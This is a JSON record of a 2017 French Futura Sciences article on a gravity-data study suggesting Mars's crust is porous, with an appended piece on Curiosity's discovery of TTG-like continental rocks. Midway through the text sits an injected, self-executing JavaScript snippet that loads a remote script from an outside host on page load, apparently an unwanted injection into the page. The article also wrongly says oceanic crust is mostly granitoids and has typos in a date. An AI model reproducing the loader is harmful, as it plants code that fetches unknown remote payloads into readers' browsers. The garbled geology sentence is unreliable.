{"title": "Surprise : la croute de Mars pourrait etre poreuse !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-09-19", "content": "Une nouvelle analyse du champ de gravite de Mars semble montrer que la croute de cette planete serait moins dense que ce que l'on pensait. Ne serait-elle pas poreuse ? Ce qu'il faut retenir Du champ de gravite d'une planete peut etre deduite sa structure, comme l'epaisseur de sa croute, laquelle reflete son histoire. Un orbiteur, sensible a la gravite, peut gartographier les fluctuations de ce champ de gravite. Sur Mars, curieusement, les basaltes et les andesites qui la constituent semblent en quelque sorte poreux d'apres les dernieres analyses. Dans les coulisses de Mars Insight, le premier sismometre de la Planete rouge                       Bienvenue dans les coulisses de la preparation du sismometre Seis, developpe par le Cnes, qui sera installe sur la douzieme mission du programme americain Discovery, Insight. Prevue pour une arrivee sur Mars a la fin novembre 2018, cette station fixe deploiera ses instruments pour, litteralement, ecouter battre le coeur de la Planete rouge et nous livrer, durant au moins deux ans, des informations inedites sur sa structure interne et sa longue histoire geologique.                                       L'epaisseur et la composition mineralogique de la croute de la  Terre  est un reflet de son origine, de sa dynamique et donc de son histoire, notamment thermique. Le fond des oceans est constitue de  basalte  et la  croute oceanique , plus mince que la  croute continentale , est formee pour l'essentiel de granitoides (auxquels s'ajoutent des roches sedimentaires et metamorphiques), dont la composition est proche de celles d'autres roches plutoniques et volcaniques, les rhyolites et les andesites. Toutes ces donnees s'interpretent bien dans le cadre de la theorie de la  tectonique des plaques . Metamorphoses en planetologues, les geologues jouent aux memes jeux, par exemple sur la Lune et Mars en echantillonnant leurs roches mais aussi en determinant l'epaisseur de la croute. Ces deux astres, en effet, ont un jour contenu suffisamment de chaleur interne pour subir une differentiation, ce processus qui, sur Terre, a engendre le  manteau , le noyau et la lithosphere. La Lune et Mars doivent avoir vecu une histoire semblable mais, bien sur, avec des differences. De gauche a droite, des cartes de la topographie, du champ de gravite et de l'epaisseur de la croute de Mars. (c) Nasa, GSFC,  Scientific Visualization Studio                               Mars possede-t-elle une croute oceanique andesitique et des continents basaltiques ? L'etude du champ de gravite des planetes permet de poser des contraintes sur leur structure interne et c'est pour cette raison que les chercheurs de la Nasa ont lance il y a quelques annees la mission  Gravity Recovery and Interior Laboratory  ( Grail ). Elle a permis de preciser l'epaisseur de la croute lunaire. Les orbiteurs autour de Mars permettent egalement de faire parler son champ de gravitation et de preciser l'epaisseur de la croute martienne en combinant les donnees du champ de gravite avec l'altimetrie  laser , qui fournit une topographie precise.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ce champ de gravite se mesure par effet Doppler. En effet, la vitesse d'un orbiteur est directement affectee par les distributions et les densites de masses qu'il survole. Au-dessus d'un deficit de masse, par exemple, l'attraction gravitationnelle etant plus faible, la sonde a tendance a s'ecarter de la planete en ralentissant tres legerement. C'est ce genre de mesures qui a ete realise lors de la mission  Mars Global Surveyor . Des estimations de la nature et de l'epaisseur de la croute martienne ont donc deja ete fournies par les missions martiennes depuis plusieurs annees. Elles completent notre connaissance de la topographie et de la mineralogie de la surface de Mars qui sont quelque peu surprenantes par rapport a celles de la Planete bleue. Ainsi, il existe un contraste frappant entre les hemispheres nord et sud. Au nord, les altitudes sont basses, faisant penser a un fond d'ocean alors qu'au sud, le niveau eleve evoque les continents terrestres. Mais les << continents >> martiens sont faits essentiellement de basaltes alors que les << oceans >> martiens sont constitues d'andesites. Il y a toutefois une similitude avec la Terre, car la croute de l'hemisphere nord est moins epaisse que celle de l'hemisphere sud. La derniere carte de l'epaisseur de la croute de masse avec sa nouvelle densite. (c) Nasa                               Les planetologues cherchent encore a decrypter les messages caches dans ces donnees geologiques afin de preciser l'histoire de Mars (y a-t-il eu une  tectonique des plaques  par exemple ?) et donc d'ameliorer notre recherche de traces de vie potentielles. Recemment, ils ont precise l'epaisseur de la croute martienne en re-analysant les donnees gravimetriques des orbiteurs martiens, comme les chercheurs l'expliquent dans un article paru dans  Geophysical Research Letters . Ils ont utilise une nouvelle technique mathematique s'aidant des donnees altimetriques, deja testee sur les  donnees gravimetriques lunaires  avant la mission Grail. La meilleure resolution de la cartographie du champ de gravite fournie par les deux sondes de la mission a permis de verifier que cette technique apportait effectivement des informations cachees dans les signaux a plus basse resolution. Ces resultats montrent que la croute pourrait etre moins dense que ce que l'on pensait. Si sa composition mineralogique et son epaisseur sont bien celles que les planetologues supposent (une erreur n'est pas a exclure), alors il n'y a qu'une explication possible : la croute martienne serait en quelque sorte poreuse... Nous en saurons sans doute plus avec la mission  Mars Insight . Pour en savoir plus Quand Mars fabriquait une croute continentale Article de laurent Sacco publie le 16 uillet 20015 Jusqu'ici, le sol de Mars,  basaltique , evoquait celui de nos oceans. Mais, surprise, des roches analysees par Curiosity ressemblent a une croute continentale, analogue a celle qui se formait sur la jeune Terre durant l' Archeen . Cette decouverte martienne est donc aussi un bel exercice de planetologie comparee, l'etude de la Planete rouge permettant de mieux comprendre la bleue. Et inversement. On peut en gros diviser l'histoire de Mars en trois periodes nommees chacune d'apres une region de reference. La plus ancienne est le  Noachien  (fort taux de craterisation, presence de grands et de petits crateres d'impact), qui s'etend de la naissance de la planete jusqu'a environ 3,85 a 3,5 milliards d'annees. De 3,5 a 1,8 milliard d'annees, l'Hesperien se caracterise par la presence de petits crateres d'impact. Enfin, l'Amazonien (tres peu de crateres d'impact) recouvre la derniere periode de l'histoire de Mars. Le Noachien est une periode chaude et humide, avec tres probablement la presence d'un ocean, et l'Hesperien est marque par de grandes  eruptions volcaniques  avec d'importantes coulees de  lave . L'Amazonien serait plutot une periode seche et froide sans veritable activite, bien que ce soit probablement pendant cette periode que s'est forme le mont Olympe, le plus grand  volcan  du  Systeme solaire . Epoques geologiques de la planete Mars selon l'echelle de Hartmann et Neukum, le Noachien correspondant aux dates anterieures a 3,7 milliards d'annees avant le present. (c) Wikipedia, CC BY-SA 3.0, Who killed Bambi ?                                22 echantillons de roches martiennes sous l'oeil laser de Curiosity Une equipe internationale de mineralogistes et de planetologues comprenant cinq laboratoires francais du  CNRS  pense avoir ouvert une nouvelle  fenetre  sur le Noachien. Dans un article paru dans  Nature Geoscience ,  les chercheurs rapportent la premiere identification de roches martiennes datant de cette epoque qui seraient des restes d'une croute continentale. Jusqu'a present, la surface de Mars apparaissait comme essentiellement formee de roches basaltiques similaires a celles que l'on trouve au fond des oceans sur Terre. Cette decouverte vient de la microsonde laser  ChemCam  qui equipe le  rover  Curiosity. Rappelons que le  robot  de la Nasa s'est pose dans le  cratere Gale  qui s'est forme il y 3,61 milliards d'annees lorsqu'un petit corps celeste est entre en collision avec la Planete rouge dans une region geologiquement plus ancienne. Avec ses 2 a 3 kilometres de profondeur, ce cratere met donc a la disposition des chercheurs des roches datant du Noachien il y a environ 4 milliards d'annees. Cet echantillon rocheux martien est domine par de gros cristaux roses nacres (des feldspaths), dans lesquels sont inclus des cristaux de quartz plus petits (en gris). Il ressemble a un echantillon de croute archeenne terrestre. (c) Nasa/JPL-Caltech/MSSS                                Des TTG issus de plaques de basalte hydrate Mais qu'a donc trouve Curiosity ? Des roches legeres, riches en  feldspaths  et parfois en  quartz  qui font penser aux assemblages de roches connus sur Terre sous le nom de complexes TTG (car formes des roches de type tonalite, trondhjemite et  granodiorite ). Il s'agit d'orthogneiss gris qui constituent pres de 80 % des terrains continentaux archeens et que l'on trouve par exemple en Afrique du Sud ou a  Pilbara  en Australie-Occidentale. Rappelons que sur la Planete bleue, les basaltes oceaniques les plus vieux sont ages de 180 millions d'annees tout au plus car la croute oceanique finit par plonger par  subduction  dans le manteau. Bien qu'alteres par l'erosion et remanies par le ballet de la  tectonique des plaques , les continents restent en surface et gardent donc la memoire de l'histoire de la Terre. Selon les hypotheses actuelles, les TTG proviennent de la cristallisation d'un  magma  forme a faible profondeur par la  fusion  de plaques de basaltes oceaniques hydrates qui plongeaient dans un manteau plus chaud et plus convectif il y a plus de 2,5 milliards. Ils etaient alors les materiaux de base de la croissance des continents de l'epoque, mais leur formation a ensuite cesse quand la temperature du manteau a baisse. Sur Terre, les TTG sont donc specifiques du debut de l'Archeen et en relation avec la presence des d'oceans et d'une tectonique des plaques. L'etude de la  geologie  martienne a montre que si une tectonique des plaques a un jour existe sur Mars, elle a disparu depuis longtemps. La decouverte d'equivalents des TTG est donc interessante pour retrouver le passe de Mars il y a plus de 3,7 milliards d'annees. Elle l'est aussi dans le cadre de la planetologie comparee et peut-etre pour, indirectement, mieux comprendre comment et pourquoi la  vie  est apparue sur Terre. ", "theme": "sciences"}